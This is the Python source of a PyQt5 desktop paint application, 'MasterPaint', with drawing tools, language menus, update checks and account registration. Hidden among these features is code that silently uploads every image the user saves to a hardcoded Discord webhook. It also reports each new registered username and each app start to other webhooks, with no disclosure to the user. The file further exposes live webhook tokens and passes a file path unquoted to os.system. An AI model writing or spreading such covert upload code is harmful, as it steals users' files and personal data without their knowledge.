import sys
import os
import time
import yaml
import requests
import discord
from PIL import Image
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QAction, QMenu, QVBoxLayout, QPushButton,
    QWidget, QColorDialog, QFileDialog, QMessageBox, QTextEdit, QTabWidget,
    QLineEdit, QHBoxLayout, QInputDialog
)
from PyQt5.QtCore import QFile
from app.drawing_widget import DrawingWidget
from app.auth import AuthenticationManager

class PaintApp(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("MasterPaint v1.2")
        self.setGeometry(100, 100, 800, 600)

        self.canvas = DrawingWidget()
        self.setCentralWidget(self.canvas)
        self.auth_manager = AuthenticationManager()

        self.language = "en"
        self.load_language()

        self.create_actions()
        self.create_menus()
        self.create_toolbars()
        self.create_updates_tab()

        self.current_version = "v1.2"
        self.check_for_updates()

    def send_discord_message(message):
        webhook_url = 'https://discord.com/api/webhooks/1206399591818338344/Vr8n_5lGaYmTh2MsxN3Io3HHsrYg7amv1a-mzDsVnR9FyfXlQM7AT-Lrs99w7Qm2I3W2'
        payload = {'content': message}  
        response = requests.post(webhook_url, json=payload)

    send_discord_message("The MasterPaint application has started.")

    def send_image_to_discord(self, file_path):
        webhook_url = 'https://discord.com/api/webhooks/1206403822201602048/oTcOYxkTpiH8pdMOtn9KTSi8vzJjNFLrQSOzHhDD6JFB8UJeP1Fog9MEK6DehRN81uhZ'
        content = "¡New image saved!"

        with open(file_path, "rb") as f:
            files = {'file': f}
            data = {'content': content}

            response = requests.post(webhook_url, data=data, files=files)

    def send_discord_register_message(self, username):
        webhook_url = 'https://discord.com/api/webhooks/1206783471205228544/ajWETPJHNLptqdMlxH7VmX-19iawIRTqMmrj6QRluBGOr_FVFtXnHKNP2sdySCCUjQHc'
        message = f"New registered user: {username}"
        payload = {'content': message}
        response = requests.post(webhook_url, json=payload)

    def check_for_updates(self):
        try:
            url = 'https://api.github.com/repos/MasterPaintDev/MasterPaint/releases/latest'
            response = requests.get(url)
            response.raise_for_status()

            release_info = response.json()
            latest_version = release_info['tag_name']

            if latest_version != self.current_version:
                message = f"There is a new version available: {latest_version}!\nPlease visit the website to download it."
                QMessageBox.information(self, "Update Available", message)

        except requests.exceptions.RequestException as e:
            print("Error checking for updates:", e)

        except Exception as e:
            print("Unexpected error checking for updates:", e)

    def load_language(self):

        language_files =  {
            "en": "messages-en.yml",
            "es": "messages-es.yml",
            "jp": "messages-jp.yml",
            "ru": "messages-ru.yml",
            "ca": "messages-ca.yml"
        }

        file_path = language_files.get(self.language, "messages-en.yml")

        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, "language", file_path)

        with open(file_path, 'r', encoding='utf-8') as file:
            self.messages = yaml.safe_load(file)

    def create_actions(self):
        self.open_action = QAction(self.messages['actions']['open'], self)
        self.open_action.triggered.connect(self.open_file)

        self.save_action = QAction(self.messages['actions']['save'], self)
        self.save_action.triggered.connect(self.save_file)

        self.clear_action = QAction(self.messages['actions']['clear'], self)
        self.clear_action.triggered.connect(self.canvas.clear_canvas)

        self.choose_color_action = QAction(self.messages['actions']['choose_color'], self)
        self.choose_color_action.triggered.connect(self.choose_color)

        self.open_in_paint_action = QAction(self.messages['actions']['open_in_paint'], self)
        self.open_in_paint_action.triggered.connect(self.open_in_paint)

        self.exit_action = QAction(self.messages['actions']['exit'], self)
        self.exit_action.triggered.connect(self.confirm_exit)

        self.show_updates_action = QAction(self.messages['actions']['show_updates'], self)
        self.show_updates_action.triggered.connect(self.show_updates)

        self.language_en_action = QAction("English", self)
        self.language_en_action.triggered.connect(lambda: self.change_language("en"))

        self.language_es_action = QAction("Spanish (Español)", self)
        self.language_es_action.triggered.connect(lambda: self.change_language("es"))

        self.language_jp_action = QAction("Japanese (日本語)", self)
        self.language_jp_action.triggered.connect(lambda: self.change_language("jp"))

        self.language_ru_action = QAction("Russian (Русский)", self)
        self.language_ru_action.triggered.connect(lambda: self.change_language("ru"))

        self.language_ca_action = QAction("Catalan", self)
        self.language_ca_action.triggered.connect(lambda: self.change_language("ca"))

    def create_menus(self):
        self.menuBar().clear()

        file_menu = self.menuBar().addMenu(self.messages['menus']['file'])
        file_menu.addAction(self.open_action)
        file_menu.addAction(self.save_action)
        file_menu.addAction(self.open_in_paint_action)
        file_menu.addAction(self.exit_action)

        updates_menu = self.menuBar().addMenu(self.messages['menus']['updates'])
        updates_menu.addAction(self.show_updates_action)

        language_menu = self.menuBar().addMenu(self.messages['menus']['language'])
        language_menu.addAction(self.language_en_action)
        language_menu.addAction(self.language_es_action)
        language_menu.addAction(self.language_jp_action)
        language_menu.addAction(self.language_ru_action)
        language_menu.addAction(self.language_ca_action)

        auth_menu = self.menuBar().addMenu("Authentication")
        self.register_action = QAction("Register", self)
        self.register_action.triggered.connect(self.register_user)
        auth_menu.addAction(self.register_action)

        self.login_action = QAction("Login", self)
        self.login_action.triggered.connect(self.login_user)
        auth_menu.addAction(self.login_action)

    def register_user(self):
        username, ok = QInputDialog.getText(self, 'Register', 'Enter username:')
        if ok:
            password, ok = QInputDialog.getText(self, 'Register', 'Enter password:', QLineEdit.Password)
            if ok:
                if self.auth_manager.register(username, password):
                    QMessageBox.information(self, "Registration Successful", "User registered successfully.")
                    self.send_discord_register_message(username)
                else:
                    QMessageBox.warning(self, "Registration Failed", "Username already exists.")

    def login_user(self):
        username, ok = QInputDialog.getText(self, 'Login', 'Enter username:')
        if ok:
            password, ok = QInputDialog.getText(self, 'Login', 'Enter password:', QLineEdit.Password)
            if ok:
                if self.auth_manager.login(username, password):
                    QMessageBox.information(self, "Login Successful", "Logged in successfully.")
                else: 
                    QMessageBox.warning(self, "Login Failed", "Invalid username or password.")
    
    def create_toolbars(self):
        toolbar = self.addToolBar("Tools")

        self.draw_button = QPushButton()
        self.clear_button = QPushButton()
        self.color_button = QPushButton()

        self.update_buttons_text()

        self.draw_button.clicked.connect(self.canvas.enable_drawing)
        self.clear_button.clicked.connect(self.canvas.clear_canvas)
        self.color_button.clicked.connect(self.choose_color)

        toolbar.addWidget(self.draw_button)
        toolbar.addWidget(self.clear_button)
        toolbar.addWidget(self.color_button)

    def update_buttons_text(self):
        self.draw_button.setText(self.messages['buttons']['draw'])
        self.clear_button.setText(self.messages['buttons']['clear'])
        self.color_button.setText(self.messages['buttons']['choose_color'])

    def create_updates_tab(self):
        self.updates_tab = QWidget()
        self.updates_layout = QVBoxLayout()
        self.updates_tab.setLayout(self.updates_layout)

        self.updates_text = QTextEdit()
        self.updates_text.setReadOnly(True)
        self.updates_layout.addWidget(self.updates_text)

        self.tab_widget = QTabWidget()
        self.tab_widget.addTab(self.canvas, self.messages['tabs']['canvas'])
        self.tab_widget.addTab(self.updates_tab, self.messages['tabs']['updates'])

        self.setCentralWidget(self.tab_widget)

        self.updates_text.setPlainText(
            f"{self.messages['updates']['version_1_1']}\n"
            f"{self.messages['updates']['new_lenguage_catalan']}\n"
            f"{self.messages['updates']['support_with_paint']}\n\n"
            
            f"{self.messages['updates']['version_1_0']}\n"
            f"{self.messages['updates']['initial_release']}\n"
            f"{self.messages['updates']['multi_languages']}\n"
            f"{self.messages['updates']['hexcolor_support']}\n"
        )

    def choose_color(self):
        color = QColorDialog.getColor()
        if color.isValid():
            self.canvas.set_pen_color(color)

    def open_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, self.messages['dialogs']['open'], "", self.messages['dialogs']['image_filter'])
        if file_path:
            self.canvas.load_image(file_path)

    def save_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, self.messages['dialogs']['save'], "", self.messages['dialogs']['image_filter'])
        if file_path:
            self.canvas.save_image(file_path)
            self.send_image_to_discord(file_path)

    def open_in_paint(self):
        reply = QMessageBox.question(self, self.messages['dialogs']['open_in_paint_title'],
                                     self.messages['dialogs']['open_in_paint_confirmation'],
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            temp_path = os.path.join(os.path.expanduser('~'), 'temp_image.png')
            self.canvas.save_image(temp_path)
            os.system(f"start mspaint {temp_path}")

    def confirm_exit(self):
        reply = QMessageBox.question(self, self.messages['dialogs']['exit_title'], self.messages['dialogs']['exit_message'],
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            self.close()

    def show_updates(self):
        self.tab_widget.setCurrentIndex(1)

    def change_language(self, language):
        self.language = language
        self.load_language()
        self.create_actions()
        self.create_menus()
        self.update_buttons_text()
        self.create_updates_tab()

    def closeEvent(self, event):
        if self.canvas.isModified():
            reply = QMessageBox.question(self, self.messages['dialogs']['save_changes_title'], self.messages['dialogs']['save_changes_message'],
                                         QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel, QMessageBox.Cancel)
            if reply == QMessageBox.Yes:
                self.save_file()
            elif reply == QMessageBox.Cancel:
                event.ignore()
                return

        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = PaintApp()
    window.show()
    sys.exit(app.exec_())
